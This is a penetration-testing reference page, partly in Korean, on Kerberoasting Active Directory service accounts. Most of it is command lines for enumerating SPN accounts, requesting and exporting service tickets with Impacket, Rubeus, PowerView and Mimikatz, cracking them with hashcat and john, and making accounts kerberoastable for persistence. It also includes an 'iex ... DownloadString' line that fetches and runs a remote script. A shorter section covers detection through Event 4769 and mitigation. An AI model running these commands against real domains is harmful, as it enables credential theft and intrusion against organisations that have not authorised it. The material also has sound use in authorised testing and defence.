# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting은 **Active Directory (AD)**에서 **사용자 계정**으로 운영되는 서비스와 관련된 **TGS 티켓**의 획득에 중점을 둡니다. **컴퓨터 계정**은 제외됩니다. 이러한 티켓의 암호화는 **사용자 비밀번호**에서 유래한 키를 사용하므로 **오프라인 자격 증명 크래킹**이 가능합니다. 서비스로서 사용자 계정을 사용하는 것은 비어 있지 않은 **"ServicePrincipalName"** 속성으로 표시됩니다.

**Kerberoasting**을 실행하기 위해서는 **TGS 티켓**을 요청할 수 있는 도메인 계정이 필수적이지만, 이 과정은 **특별한 권한**을 요구하지 않으므로 **유효한 도메인 자격 증명**을 가진 누구나 접근할 수 있습니다.

### 주요 사항:

- **Kerberoasting**은 **AD** 내의 **사용자 계정 서비스**에 대한 **TGS 티켓**을 목표로 합니다.
- **사용자 비밀번호**에서 유래한 키로 암호화된 티켓은 **오프라인에서 크랙**될 수 있습니다.
- 서비스는 null이 아닌 **ServicePrincipalName**으로 식별됩니다.
- **특별한 권한**이 필요 없으며, 단지 **유효한 도메인 자격 증명**만 필요합니다.

### **공격**

> [!WARNING]
> **Kerberoasting 도구**는 공격을 수행하고 TGS-REQ 요청을 시작할 때 일반적으로 **`RC4 암호화`**를 요청합니다. 이는 **RC4가** [**더 약하고**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) Hashcat과 같은 도구를 사용하여 오프라인에서 크랙하기 더 쉽기 때문입니다.\
> RC4 (유형 23) 해시는 **`$krb5tgs$23$*`**로 시작하고, AES-256(유형 18)은 **`$krb5tgs$18$*`**로 시작합니다.\
> 또한, `Rubeus.exe kerberoast`는 모든 취약한 계정에 대해 자동으로 티켓을 요청하므로 주의해야 합니다. 먼저 흥미로운 권한을 가진 kerberoastable 사용자를 찾고, 그들에 대해서만 실행하세요.
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # 비밀번호가 요청됩니다
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. kerberoastable 사용자 열거
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. 해시 덤프
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Kerberoastable 사용자 가져오기
setspn.exe -Q */* #이것은 내장 바이너리입니다. 사용자 계정에 집중하세요.
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
# 단일 사용자로부터 메모리에서 TGS 가져오기
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #예: MSSQLSvc/mgmt.domain.local

# 모든 kerberoastable 계정에 대한 TGS 가져오기 (PC 포함, 그리 스마트하지 않음)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# 메모리에서 kerberos 티켓 목록
klist

# 메모리에서 추출
Invoke-Mimikatz -Command '"kerberos::list /export"' #티켓을 현재 폴더로 내보내기

# kirbi 티켓을 john으로 변환
python2.7 kirbi2john.py sqldev.kirbi
# john을 hashcat으로 변환
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: 사용자 Kerberoast 해시 가져오기
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #PowerView 사용 예: MSSQLSvc/mgmt.domain.local
# Powerview: 모든 Kerberoast 해시 가져오기
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #특정 사용자
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #관리자 가져오기

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
